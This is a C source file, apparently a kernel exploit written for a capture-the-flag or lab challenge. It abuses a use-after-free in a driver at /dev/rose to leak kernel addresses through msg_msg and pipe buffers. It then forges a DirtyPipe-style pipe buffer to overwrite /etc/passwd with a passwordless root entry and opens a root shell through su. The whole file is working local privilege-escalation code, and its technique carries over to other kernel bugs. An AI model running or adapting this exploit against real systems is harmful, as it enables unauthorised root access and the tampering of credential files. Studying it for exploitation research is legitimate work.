#define _GNU_SOURCE
#include <stdio.h>
#include <sys/stat.h>
#include <stdlib.h>
#include <linux/types.h>
#include <errno.h>
#include <fcntl.h>
#include <unistd.h>
#include <assert.h>
#include <stdint.h>
#include <sys/msg.h>
#include <string.h>

// Inspired by https://0x434b.dev/learning-linux-kernel-exploitation-part-2-cve-2022-0847/#back-to-2022-â€“-dirtypipe

#define BUFF_SIZE 0x400

struct {
    int pipefd[2];
    int passwdfd;
    int passwdlen;
    uint64_t vmemmap_addr;
    uint64_t page_cache_pipe_buf_ops;
} context;

void setup() {
    int ret;

    struct stat st;
    ret = stat("/etc/passwd", &st);
    assert(ret != -1);
    context.passwdlen = st.st_size;

    context.passwdfd = open("/etc/passwd", O_RDONLY);
    assert(context.passwdfd != -1);
}

void oob_leak() {
    int ret;

    int fd1 = open("/dev/rose", O_RDWR);
    assert(fd1 != -1);
    int fd2 = open("/dev/rose", O_RDWR);
    assert(fd2 != -1);
    int fd3 = open("/dev/rose", O_RDWR);
    assert(fd3 != -1);
    close(fd2);

    ret = pipe(context.pipefd);
    assert(ret == 0);

    char tmp[0x1000];
    memset(tmp, 'A', 0x1000);
    write(context.pipefd[1], tmp, 0x1000);
    write(context.pipefd[1], tmp, 0x1000);
    close(fd3);

    struct {
        long mtype;
        char mtext[BUFF_SIZE - 0x30];
    } msg;
    memset(msg.mtext, '\0', BUFF_SIZE - 0x30 - 1);
    msg.mtext[BUFF_SIZE - 0x30 - 1] = '\0';
    msg.mtype = 1;

    int msqid = msgget(IPC_PRIVATE, 0644 | IPC_CREAT);
    assert(msqid != -1);
    msgsnd(msqid, &msg, sizeof(msg.mtext), 0);

    off_t offset = 1;
    ret = splice(context.passwdfd, &offset, context.pipefd[1], NULL, 1, 0);
    assert(ret != -1);

    struct {
        long mtype;
        char mtext[BUFF_SIZE - 0x30];
    } msg2;
    msgrcv(msqid, &msg2, sizeof(msg.mtext), 1, IPC_NOWAIT | MSG_NOERROR);
    // MSG_COPY -> kernel won't remove this msg

    uint64_t *leak = (uint64_t *)msg2.mtext;
    context.vmemmap_addr = leak[4];
    context.page_cache_pipe_buf_ops = leak[6];

    printf("[*] vmemmap_addr = %#0llx\n", context.vmemmap_addr);
    printf("[*] page_cache_pipe_buf_ops = %#0llx\n", context.page_cache_pipe_buf_ops);
}

void write_file() {
    struct {
        long mtype;
        char mtext[BUFF_SIZE - 0x30];
    } msg;
    memset(msg.mtext, '\0', BUFF_SIZE - 0x30 - 1);
    ((uint64_t *)msg.mtext)[4] = context.vmemmap_addr;
    //((uint64_t *)msg.mtext)[5] = context.passwdlen;
    ((uint64_t *)msg.mtext)[5] = 0;
    ((uint64_t *)msg.mtext)[6] = context.page_cache_pipe_buf_ops;
    ((uint64_t *)msg.mtext)[7] = 0x10; // PIPE_BUF_FLAG_CAN_MERGE
    ((uint64_t *)msg.mtext)[8] = 0x0;
    msg.mtext[BUFF_SIZE - 0x30 - 1] = '\0';
    msg.mtype = 1;

    int msqid = msgget(IPC_PRIVATE, 0644 | IPC_CREAT);
    assert(msqid != -1);
    msgsnd(msqid, &msg, sizeof(msg.mtext), 0);

    char *passwd_entry = malloc(context.passwdlen);
    memset(passwd_entry, '\n', context.passwdlen - 1);
    passwd_entry[context.passwdlen - 1] = '\0';
    strcpy(passwd_entry, "root::0:0::/root:/bin/sh\n");
    write(context.pipefd[1], passwd_entry, context.passwdlen);
    free(passwd_entry);

    char result[0x100];
    read(context.passwdfd, result, 0x100);
    printf("Overwritten /etc/passwd:\n");
    printf("%s", result);

    //system("cat /etc/passwd");
}

int main() {
    system("cp /etc/passwd /tmp/passwd"); // store a copy of "/etc/passwd"
    setup();
    oob_leak();
    write_file();
    system("su -c 'cp /tmp/passwd /etc/passwd; rm /tmp/passwd; sh'");
}
